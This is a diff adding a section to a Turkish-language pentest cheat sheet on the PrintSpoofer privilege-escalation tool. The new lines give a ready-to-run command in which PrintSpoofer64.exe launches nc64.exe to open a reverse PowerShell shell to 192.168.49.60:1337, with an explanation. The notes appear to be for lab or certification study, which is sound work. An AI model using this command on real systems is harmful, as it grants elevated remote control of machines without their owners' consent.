@@ -116,6 +116,15 @@ PrintSpoofer.exe -i -c "cmd.exe /c whoami"
 .\PrintSpoofer.exe -i -c "powershell.exe -c whoami"
 ```
 
+#### 🖥️ 64-bit Örnek / Reverse Shell Payload
+Eğer hedefte 64-bit bir PrintSpoofer varsa ve attacker sunucunda `nc64.exe` konumlandırdıysan, doğrudan hedefe netcat binary'si ile reverse shell komutunu çalıştırabilirsin:
+
+```powershell
+.\PrintSpoofer64.exe -c "C:\xampp\htdocs\nc64.exe 192.168.49.60 1337 -e powershell"
+```
+
+Bu örnek, hedef üzerinde `PrintSpoofer64.exe` çalıştırılarak hedefin `C:\xampp\htdocs` içindeki `nc64.exe`'yi hedef üzerinde çalıştırıp `192.168.49.60:1337` adresine PowerShell ters bağlanışı başlatır.
+
 **Flags Açıklaması:**
 - `-i` = Interactive (etkileşimli shell açar)
 - `-c` = Command (belirtilen komutu çalıştır)
